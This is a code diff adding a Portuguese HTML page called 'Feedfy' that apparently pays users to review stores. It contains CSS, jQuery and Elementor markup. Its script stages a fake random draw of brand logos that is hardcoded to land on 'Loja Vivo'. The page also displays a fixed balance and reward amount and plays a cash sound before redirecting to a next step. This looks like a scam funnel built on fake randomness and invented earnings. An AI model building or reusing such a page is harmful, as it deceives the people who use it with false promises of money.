@@ -1,0 +1,936 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0;user-scalable=no">
+    <script src="./script.js"></script>
+    <script src="js/jquery.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="./styles/font.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/021532d534.js" crossorigin="anonymous"></script>
+    <title>Feedfy</title>
+    <style>
+        /* CONTAINER DE AVALIAÇÃO */
+        .rating-container {
+            margin: 0px auto 20px auto;
+            max-width: 600px;
+            /* Define uma largura máxima para o container */
+            text-align: center;
+            /* Centraliza o texto e elementos filhos */
+        }
+
+        /* PERGUNTA DE AVALIAÇÃO */
+        .rating-question {
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 1.2rem;
+            /* Ajuste conforme necessário */
+            color: #333;
+            /* Cor editável */
+            margin-bottom: 10px;
+        }
+
+        /* ESTRELAS DE AVALIAÇÃO */
+        .rating {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+            /* Espaço entre as estrelas e as labels */
+            padding-bottom: 0px;
+        }
+
+        .rating input {
+            position: absolute;
+            left: -100vw;
+        }
+
+        .rating label {
+            scale: 0.8;
+            width: 48px;
+            height: 48px;
+            padding: 48px 0 0;
+            overflow: hidden;
+            background: url('images/estrelas.svg') no-repeat top left;
+            filter: grayscale(00%) brightness(60%) sepia(00%) hue-rotate(210deg) brightness(100%) contrast(100%);
+            transition: filter 0.3s;
+            /* Transição suave */
+            margin: -10px 0px -10px 0px;
+            /* Ajuste a distância entre as estrelas */
+        }
+
+        .rating input:checked ~ input + label, .rating input:hover ~ input + label {
+            filter: none;
+            /* Remove o filtro para a cor ativa */
+        }
+
+        .rating:not(:hover) input:indeterminate + label, .rating:not(:hover) input:checked ~ input + label, .rating input:hover ~ input + label {
+            background-position: -48px 0;
+        }
+
+        .rating:not(:hover) input:focus-visible + label {
+            background-position: -96px 0;
+        }
+
+        /* TEXTOS ABAIXO DAS ESTRELAS */
+        .rating-labels {
+            display: flex;
+            justify-content: space-between;
+            font-family: 'Sora', sans-serif;
+            font-size: 0.8rem;
+            /* Fonte pequena */
+            color: #333;
+            /* Cor editável */
+            margin: 0 24px;
+            /* Espaço nas laterais */
+        }
+
+        .label-left, .label-right {
+            display: block;
+        }
+
+        /* CONTAINER DE AVALIAÇÃO DE PREÇO */
+        .price-container {
+            margin: 0 auto 40px auto;
+            max-width: 600px;
+            /* Define uma largura máxima para o container */
+            text-align: center;
+            /* Centraliza o texto e elementos filhos */
+        }
+
+        /* BOTÕES DE AVALIAÇÃO DE PREÇO */
+        .price-rating {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+            /* Espaço entre os botões e a caixa de comentários */
+        }
+
+        .price-button {
+            background-color: #f1f1f1;
+            /* Cor de fundo padrão */
+            border: 2px solid #ccc;
+            /* Cor da borda padrão */
+            border-radius: 10px;
+            padding-top: var(--button-padding-top, 10px);
+            /* Padding superior ajustável */
+            padding-right: var(--button-padding-right, 30px);
+            /* Padding direito ajustável */
+            padding-bottom: var(--button-padding-bottom, 10px);
+            /* Padding inferior ajustável */
+            padding-left: var(--button-padding-left, 30px);
+            /* Padding esquerdo ajustável */
+            margin-top: var(--button-margin-top, 10px);
+            /* Margin superior ajustável */
+            margin-right: var(--button-margin-right, 5px);
+            /* Margin direito ajustável */
+            margin-bottom: var(--button-margin-bottom, 0px);
+            /* Margin inferior ajustável */
+            margin-left: var(--button-margin-left, 5px);
+            /* Margin esquerdo ajustável */
+            font-size: 2rem;
+            /* Tamanho do texto */
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s, opacity 0.3s;
+            color: #000;
+            /* Cor do texto inativo, ajuste conforme necessário */
+        }
+
+        .price-button:hover {
+            background-color: #fff;
+            /* Cor de fundo padrão */
+            border-color: #9a03d7;
+            /* Cor da borda inativa */
+            color: #9a03d7;
+        }
+
+        .price-button.active {
+            background-color: var(--button-active-background-color, #9a03d7);
+            /* Cor do fundo ativo */
+            color: var(--button-active-text-color, white);
+            /* Cor do texto ativo */
+            border-color: var(--button-active-border-color, #9a03d7);
+            /* Cor da borda ativa */
+            opacity: 1;
+            /* Opacidade total para o botão ativo */
+        }
+
+        .price-button.inactive {
+            opacity: 0.5;
+            /* Opacidade para botões inativos */
+            background-color: #f0f0f0;
+            /* Cor de fundo inativa */
+            border-color: #ccc;
+            /* Cor da borda inativa */
+            color: #000;
+            /* Cor do texto inativo, ajuste conforme necessário */
+        }
+
+        /* CONTAINER DE COMENTÁRIOS */
+        .comments-container {
+            margin: 0 auto;
+            max-width: 600px;
+            /* Define uma largura máxima para o container */
+            text-align: center;
+            /* Centraliza o texto e elementos filhos */
+        }
+
+        /* TÍTULO DA CAIXA DE COMENTÁRIOS */
+        .comments-title {
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 1rem;
+            /* Ajuste conforme necessário */
+            color: #333;
+            /* Cor editável */
+            margin-bottom: 10px;
+        }
+
+        /* CAIXA DE TEXTO PARA COMENTÁRIOS */
+        .comments-box {
+            width: 95%;
+            max-width: 600px;
+            /* Ajuste conforme necessário */
+            background-color: #fff;
+            /* Cor do fundo da caixa de texto */
+            border: 1px solid #ccc;
+            /* Cor da borda da caixa de texto */
+            border-radius: 15px;
+            padding: var(--textarea-padding, 10px);
+            /* Padding ajustável */
+            font-family: 'Sora', sans-serif;
+            font-size: 1rem;
+            /* Ajuste conforme necessário */
+            margin-top: var(--textarea-margin-top, 0px);
+            /* Margin superior ajustável */
+            margin-right: var(--textarea-margin-right, 0px);
+            /* Margin direito ajustável */
+            margin-bottom: var(--textarea-margin-bottom, 0px);
+            /* Margin inferior ajustável */
+            margin-left: var(--textarea-margin-left, 0px);
+            /* Margin esquerdo ajustável */
+        }
+
+        /* MEDIA QUERIES PARA TELA DE TABLET E MOBILE */
+        @media (max-width: 768px) {
+            .rating-question {
+                font-size: 1rem;
+                /* Ajuste o tamanho da fonte para tablets */
+            }
+
+            .rating-labels {
+                font-size: 0.7rem;
+                /* Ajuste o tamanho da fonte para tablets */
+                margin: 0 10px;
+                /* Ajuste o espaço nas laterais */
+            }
+
+            .price-button {
+                font-size: 0.9rem;
+                /* Ajuste o tamanho da fonte para tablets */
+                padding: 8px 20px;
+                /* Ajuste o padding para tablets */
+            }
+
+            .comments-title {
+                font-size: 0.9rem;
+                /* Ajuste o tamanho da fonte para tablets */
+            }
+
+            .comments-box {
+                font-size: 0.9rem;
+                /* Ajuste o tamanho da fonte para tablets */
+            }
+        }
+
+        @media (max-width: 480px) {
+            .rating-question {
+                font-size: 1.2rem;
+                /* Ajuste o tamanho da fonte para dispositivos móveis */
+            }
+
+            .rating-labels {
+                font-size: 0.8rem;
+                /* Ajuste o tamanho da fonte para dispositivos móveis */
+                margin: 0 5px;
+                /* Ajuste o espaço nas laterais */
+            }
+
+            .price-button {
+                font-size: 30px;
+                /* Ajuste o tamanho da fonte para dispositivos móveis */
+                padding: 10px 30px;
+                /* Ajuste o padding para dispositivos móveis */
+            }
+
+            .comments-title {
+                font-size: 1rem;
+                /* Ajuste o tamanho da fonte para dispositivos móveis */
+                margin-top: -20px;
+            }
+
+            .comments-box {
+                font-size: 1rem;
+                /* Ajuste o tamanho da fonte para dispositivos móveis */
+            }
+
+            .rating-container {
+                margin: 0px auto 13px auto;
+            }
+
+            .comments-container {
+                margin: -10px auto;
+                max-width: 600px;
+                /* Define uma largura máxima para o container */
+                text-align: center;
+                /* Centraliza o texto e elementos filhos */
+            }
+        }
+    </style>
+  </head>
+  
+    <body><div class="header">
+      <img src="images/logo2.png" alt="">
+      <div class="saldo">
+        <h5>Saldo</h5>
+        <p>R$ <span id="saldo">70,83</span></p>
+      </div>
+    </div>
+    <div class="container">
+        <audio id="audio" src="media/cash.mp3"></audio>
+        <div class="title" id="title-loading">
+            <img decoding="async" width="256" height="256" src="images/cd514331234507.564a1d2324e4e.gif" class="" alt="">
+            <p>Carregando novo estabelecimento</p>
+        </div>
+
+        <div class="title d-none" id="title-success">
+            <svg xmlns="http://www.w3.org/2000/svg" class="svg-icon" style="width: 2em; height: 1.5em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1"><path d="M426.666667 725.333333l-213.333334-213.333333 60.16-60.16L426.666667 604.586667l323.84-323.84L810.666667 341.333333z m85.333333-640a426.666667 426.666667 0 1 0 426.666667 426.666667A426.666667 426.666667 0 0 0 512 85.333333z" fill="#820ad1"></path></svg>            <p>Estabelecimento encontrado</p>
+        </div>
+
+        <div class="elementor-element elementor-element-38cff10 conteinerprincipal e-con-full e-flex e-con e-child" data-id="38cff10" data-element_type="container" data-settings="{" background_background":"classic"}"="">
+            <div class="elementor-element elementor-element-70291b04 elementor-widget elementor-widget-html" data-id="70291b04" data-element_type="widget" data-widget_type="html.default">
+            <div class="elementor-widget-container">
+        <style>
+/* Estilos para os botões bt0 a bt3 */
+.bt0, .bt1, .bt2, .bt3 {
+  margin-top: 15px; /* Define uma margem superior de 15px */
+  padding-bottom: 15px; /* Define um espaçamento interno inferior de 15px */
+}
+
+/* Estilo para elementos com a classe 'str' */
+.str {
+  margin-top: 15px; /* Define uma margem superior de 15px */
+  padding-bottom: 15px; /* Define um espaçamento interno inferior de 15px */
+}
+
+/* Estilo para elementos de item que serão mostrados e ocultados */
+.item {
+  display: none; /* Esconde o elemento inicialmente */
+  font-size: 2rem; /* Define o tamanho da fonte para 2rem */
+  text-align: center; /* Centraliza o texto */
+  margin: 20px; /* Define uma margem de 20px */
+}
+
+/* Estilo para elementos visíveis */
+.visible {
+  display: block; /* Mostra o elemento */
+  opacity: 1; /* Define opacidade total */
+  transition: opacity 1s ease-in-out; /* Transição suave de opacidade */
+}
+
+/* Estilo para elementos escondidos */
+.hidden {
+  opacity: 0; /* Define opacidade zero para esconder o elemento */
+  transition: opacity 1s ease-in-out; /* Transição suave de opacidade */
+}
+</style>
+
+<script>
+// Lista de classes usadas no sorteio
+let classes = ['nike', 'ipiranga', 'riachuelo', 'cia', 'mcdonalds', 'carrefour', 'americanas', 'casasbahia', 'burgerking', 'adidas', 'lojavivo', 'consigaz', 'extrasupermercado', 'magazineluiza', 'lojasrenner'];
+let currentIndex = 0; // Índice atual para controle do sorteio
+let interval; // Variável para armazenar o intervalo do sorteio
+let chosenClass = 'lojavivo'; // Classe onde o sorteio deve parar
+
+// Função para iniciar o sorteio
+function startLottery() {
+    clearInterval(interval); // Limpa qualquer intervalo existente
+    document.querySelectorAll('.item').forEach(item => item.classList.remove('visible')); // Esconde todos os itens
+
+    // Inicia o intervalo para alternar entre os itens
+    interval = setInterval(() => {
+        document.querySelectorAll('.item').forEach(item => item.classList.remove('visible')); // Esconde todos os itens
+        document.querySelector(`.${classes[currentIndex]}`).classList.add('visible'); // Mostra o item atual
+        currentIndex = (currentIndex + 1) % classes.length; // Atualiza o índice, voltando ao início se necessário
+    }, 100); // Intervalo de 100ms por item
+
+    setTimeout(stopLottery, 3000); // Para o sorteio após 3 segundos
+}
+
+// Função para parar o sorteio
+function stopLottery() {
+    clearInterval(interval); // Para o intervalo
+    document.querySelectorAll('.item').forEach(item => item.classList.remove('visible')); // Esconde todos os itens
+    document.querySelector(`.${chosenClass}`).classList.add('visible'); // Mostra o item da classe escolhida
+}
+
+function nextPage() {
+    $('#audio')[0].play();
+    setTimeout(() => {
+        window.location.href="etapa3.html"
+    }, 1500);
+}
+
+// Função executada quando o DOM está completamente carregado
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(startLottery, 1000); // Inicia o sorteio 1 segundo após o carregamento da página
+
+    setTimeout(function() {
+        // Manipulação de visibilidade de elementos específicos
+        const procurando = document.querySelector('.procurando');
+        const procurando2 = document.querySelector('.procurando2');
+        const encontrado = document.querySelector('.encontrado');
+        const riachueloQuizz = document.querySelector('.riachueloquizz');
+
+        // Esconde elementos de busca
+
+        $('#title-loading').addClass('d-none');
+        $('#title-success').removeClass('d-none');
+        $("#all-content").removeClass("d-none")
+    }, 4000); // Executa após 4 segundos
+});
+</script>
+    </div>
+            </div>
+            <div class=" elementor-element elementor-element-139eb773 item nike elementor-widget elementor-widget-image" data-id="139eb773" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/2nike.webp" class="attachment-large size-large wp-image-2028" alt="" srcset="images/2nike.webp 700w, images/2nike-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-8dbe960 item ipiranga elementor-widget elementor-widget-image" data-id="8dbe960" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="800" height="568" src="images/ipianga-1024x727.webp" class="attachment-large size-large wp-image-2014" alt="" srcset="images/ipianga-1024x727.webp 1024w, images/ipianga-300x213.webp 300w, images/ipianga-768x545.webp 768w, images/ipianga.webp 1200w" sizes="(max-width: 800px) 100vw, 800px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-79bd5765 item riachuelo elementor-widget elementor-widget-image visible" data-id="79bd5765" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/2riachuelo.webp" class="attachment-large size-large wp-image-2027" alt="" srcset="images/2riachuelo.webp 700w, images/2riachuelo-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-2ee11892 item cia elementor-widget elementor-widget-image" data-id="2ee11892" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/2cia.webp" class="attachment-large size-large wp-image-2025" alt="" srcset="images/2cia.webp 700w, images/2cia-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-5ff2e101 item mcdonalds elementor-widget elementor-widget-image" data-id="5ff2e101" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/2mcdonalds.webp" class="attachment-large size-large wp-image-2023" alt="" srcset="images/2mcdonalds.webp 700w, images/2mcdonalds-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-35d7b711 item carrefour elementor-widget elementor-widget-image" data-id="35d7b711" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/2carrefour.webp" class="attachment-large size-large wp-image-2024" alt="" srcset="images/2carrefour.webp 700w, images/2carrefour-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-38fb174 item americanas elementor-widget elementor-widget-image" data-id="38fb174" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/americans.webp" class="attachment-large size-large wp-image-2033" alt="" srcset="images/americans.webp 700w, images/americans-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-28fb7c2a item casasbahia elementor-widget elementor-widget-image" data-id="28fb7c2a" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/casa-bahia.webp" class="attachment-large size-large wp-image-2034" alt="" srcset="images/casa-bahia.webp 700w, images/casa-bahia-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-9c93aa2 item burgerking elementor-widget elementor-widget-image" data-id="9c93aa2" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/burguer-king.webp" class="attachment-large size-large wp-image-2035" alt="" srcset="images/burguer-king.webp 700w, images/burguer-king-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-60150cb7 item adidas elementor-widget elementor-widget-image" data-id="60150cb7" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/adidas.webp" class="attachment-large size-large wp-image-2228" alt="" srcset="images/adidas.webp 700w, images/adidas-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-d2543b6 item lojavivo elementor-widget elementor-widget-image" data-id="d2543b6" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/vivo.webp" class="attachment-large size-large wp-image-2036" alt="" srcset="images/vivo.webp 700w, images/vivo-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-33c541d2 item consigaz elementor-widget elementor-widget-image" data-id="33c541d2" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/consigaz.webp" class="attachment-large size-large wp-image-2037" alt="" srcset="images/consigaz.webp 700w, images/consigaz-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-3640b7c1 item extrasupermercado elementor-widget elementor-widget-image" data-id="3640b7c1" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/extra.webp" class="attachment-large size-large wp-image-2038" alt="" srcset="images/extra.webp 700w, images/extra-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-418f03ef item magazineluiza elementor-widget elementor-widget-image" data-id="418f03ef" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/MAGALU.webp" class="attachment-large size-large wp-image-2039" alt="" srcset="images/MAGALU.webp 700w, images/MAGALU-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+            <div class="elementor-element elementor-element-57a95749 item lojasrenner elementor-widget elementor-widget-image" data-id="57a95749" data-element_type="widget" data-widget_type="image.default">
+            <div class="elementor-widget-container">
+                                                <img loading="lazy" decoding="async" width="700" height="497" src="images/renner.webp" class="attachment-large size-large wp-image-2040" alt="" srcset="images/renner.webp 700w, images/renner-300x213.webp 300w" sizes="(max-width: 700px) 100vw, 700px">													</div>
+            </div>
+    <div id="all-content" class="d-none elementor-element elementor-element-f362865 e-con-full riachueloquizz e-flex e-con e-child visible" data-id="f362865" data-element_type="container">
+            <div class="elementor-element elementor-element-00165bd str elementor-widget elementor-widget-heading" data-id="00165bd" data-element_type="widget" data-widget_type="heading.default">
+            <div class="elementor-widget-container">
+        <h2 class="elementor-heading-title elementor-size-default" style="color: #9a03d7;">R$ 89,21</h2>		</div>
+            </div>
+            <div class="elementor-element elementor-element-56c278c3 elementor-widget elementor-widget-heading" data-id="56c278c3" data-element_type="widget" data-widget_type="heading.default">
+            <div class="elementor-widget-container">
+        <h2 class="elementor-heading-title elementor-size-default" style="color: #7c04ac; font-size: 35px;">Loja Vivo</h2>		</div>
+            </div>
+            <div class="elementor-element elementor-element-1a9b26d7 str elementor-widget elementor-widget-rating" data-id="1a9b26d7" data-element_type="widget" data-widget_type="rating.default">
+            <div class="elementor-widget-container">
+                <div class="e-rating" itemtype="https://schema.org/Rating" itemscope="" itemprop="reviewRating">
+        <meta itemprop="worstRating" content="0">
+        <meta itemprop="bestRating" content="5">
+            </div>
+            <div class="e-rating" itemtype="https://schema.org/Rating" itemscope="" itemprop="reviewRating">
+                <meta itemprop="worstRating" content="0">
+                <meta itemprop="bestRating" content="5">
+                <div class="e-rating-wrapper" itemprop="ratingValue" content="4.49" role="img" aria-label="Classificado como 4.49 de 5">
+                                <div class="e-icon">
+                    <div class="e-icon-wrapper e-icon-marked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                    <div class="e-icon-wrapper e-icon-unmarked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                </div>
+                            <div class="e-icon">
+                    <div class="e-icon-wrapper e-icon-marked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                    <div class="e-icon-wrapper e-icon-unmarked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                </div>
+                            <div class="e-icon">
+                    <div class="e-icon-wrapper e-icon-marked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                    <div class="e-icon-wrapper e-icon-unmarked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                </div>
+                            <div class="e-icon">
+                    <div class="e-icon-wrapper e-icon-marked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                    <div class="e-icon-wrapper e-icon-unmarked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                </div>
+                            <div class="e-icon">
+                    <div class="e-icon-wrapper e-icon-marked" style="--e-rating-icon-marked-width: 49%;">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                    <div class="e-icon-wrapper e-icon-unmarked">
+                        <svg aria-hidden="true" class="e-font-icon-svg e-eicon-star" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M450 75L338 312 88 350C46 354 25 417 58 450L238 633 196 896C188 942 238 975 275 954L500 837 725 954C767 975 813 942 804 896L763 633 942 450C975 417 954 358 913 350L663 312 550 75C529 33 471 33 450 75Z"></path></svg>				</div>
+                </div>
+                            </div>
+            </div>
+            <div class="elementor-element elementor-element-423eb4ad rating elementor-widget elementor-widget-html" data-id="423eb4ad" data-element_type="widget" data-widget_type="html.default">
+            <div class="elementor-widget-container">
+        <div class="rating-container">
+<div class="rating-question">Que nota você daria ao ambiente?</div>
+<div class="rating" id="rating-environment">
+<input id="rating-environment1" type="radio" name="rating-environment" value="1">
+<label for="rating-environment1">1</label>
+<input id="rating-environment2" type="radio" name="rating-environment" value="2">
+<label for="rating-environment2">2</label>
+<input id="rating-environment3" type="radio" name="rating-environment" value="3">
+<label for="rating-environment3">3</label>
+<input id="rating-environment4" type="radio" name="rating-environment" value="4">
+<label for="rating-environment4">4</label>
+<input id="rating-environment5" type="radio" name="rating-environment" value="5">
+<label for="rating-environment5">5</label>
+</div>
+<div class="rating-labels">
+<span class="label-left">Muito ruim</span>
+<span class="label-right">Muito bom</span>
+</div>
+</div>
+
+<!-- Repetir a estrutura para as outras perguntas -->
+<div class="rating-container">
+<div class="rating-question">Qual foi a sua experiência com o atendimento?</div>
+<div class="rating" id="rating-service">
+<input id="rating-service1" type="radio" name="rating-service" value="1">
+<label for="rating-service1">1</label>
+<input id="rating-service2" type="radio" name="rating-service" value="2">
+<label for="rating-service2">2</label>
+<input id="rating-service3" type="radio" name="rating-service" value="3">
+<label for="rating-service3">3</label>
+<input id="rating-service4" type="radio" name="rating-service" value="4">
+<label for="rating-service4">4</label>
+<input id="rating-service5" type="radio" name="rating-service" value="5">
+<label for="rating-service5">5</label>
+</div>
+<div class="rating-labels">
+<span class="label-left">Muito ruim</span>
+<span class="label-right">Muito bom</span>
+</div>
+</div>
+
+<div class="rating-container">
+<div class="rating-question">Como você descreveria a qualidade dos serviços?</div>
+<div class="rating" id="rating-food">
+<input id="rating-food1" type="radio" name="rating-food" value="1">
+<label for="rating-food1">1</label>
+<input id="rating-food2" type="radio" name="rating-food" value="2">
+<label for="rating-food2">2</label>
+<input id="rating-food3" type="radio" name="rating-food" value="3">
+<label for="rating-food3">3</label>
+<input id="rating-food4" type="radio" name="rating-food" value="4">
+<label for="rating-food4">4</label>
+<input id="rating-food5" type="radio" name="rating-food" value="5">
+<label for="rating-food5">5</label>
+</div>
+<div class="rating-labels">
+<span class="label-left">Muito ruim</span>
+<span class="label-right">Muito bom</span>
+</div>
+</div>
+
+<!-- Nova pergunta com botões -->
+<div class="price-container">
+<div class="rating-question">O que você achou do preço?</div>
+<div class="price-rating">
+<button class="price-button" data-value="$">$</button>
+<button class="price-button" data-value="$$">$$</button>
+<button class="price-button" data-value="$$$">$$$</button>
+</div>
+</div>
+
+<!-- Caixa de texto para comentários adicionais -->
+
+<script>
+document.querySelectorAll('.price-button').forEach(button => {
+button.addEventListener('click', () => {
+// Remove a classe de ativo e adiciona a de inativo para todos os botões
+document.querySelectorAll('.price-button').forEach(btn => {
+  btn.classList.remove('active');
+  btn.classList.add('inactive');
+});
+
+// Adiciona a classe de ativo e remove a de inativo para o botão clicado
+button.classList.add('active');
+button.classList.remove('inactive');
+});
+});
+</script>
+
+
+<!-- VISUAL CSS -->
+
+<style>
+/* CONTAINER DE AVALIAÇÃO */
+.rating-container {
+margin: 0px auto 20px auto;
+max-width: 600px; /* Define uma largura máxima para o container */
+text-align: center; /* Centraliza o texto e elementos filhos */
+}
+
+/* PERGUNTA DE AVALIAÇÃO */
+.rating-question {
+font-family: 'Sora', sans-serif;
+font-weight: bold;
+font-size: 1.2rem; /* Ajuste conforme necessário */
+color: #333; /* Cor editável */
+margin-bottom: 10px;
+}
+
+/* ESTRELAS DE AVALIAÇÃO */
+.rating {
+display: flex;
+justify-content: center;
+align-items: center;
+margin-bottom: 10px; /* Espaço entre as estrelas e as labels */
+padding-bottom: 0px;
+}
+
+.rating input {
+position: absolute;
+left: -100vw;
+}
+
+.rating label {
+scale: 0.8;
+width: 48px;
+height: 48px;
+padding: 48px 0 0;
+overflow: hidden;
+background: url('images/estrelas.svg') no-repeat top left;
+filter: grayscale(00%) brightness(60%) sepia(00%) hue-rotate(210deg) brightness(100%) contrast(100%);
+transition: filter 0.3s; /* Transição suave */
+margin: -10px 0px -10px 0px; /* Ajuste a distância entre as estrelas */
+}
+
+.rating input:checked ~ input + label,
+.rating input:hover ~ input + label {
+filter: none; /* Remove o filtro para a cor ativa */
+}
+
+.rating:not(:hover) input:indeterminate + label,
+.rating:not(:hover) input:checked ~ input + label,
+.rating input:hover ~ input + label {
+background-position: -48px 0;
+}
+
+.rating:not(:hover) input:focus-visible + label {
+background-position: -96px 0;
+}
+
+/* TEXTOS ABAIXO DAS ESTRELAS */
+.rating-labels {
+display: flex;
+justify-content: space-between;
+font-family: 'Sora', sans-serif;
+font-size: 0.8rem; /* Fonte pequena */
+color: #333; /* Cor editável */
+margin: 0 24px; /* Espaço nas laterais */
+}
+
+.label-left,
+.label-right {
+display: block;
+}
+
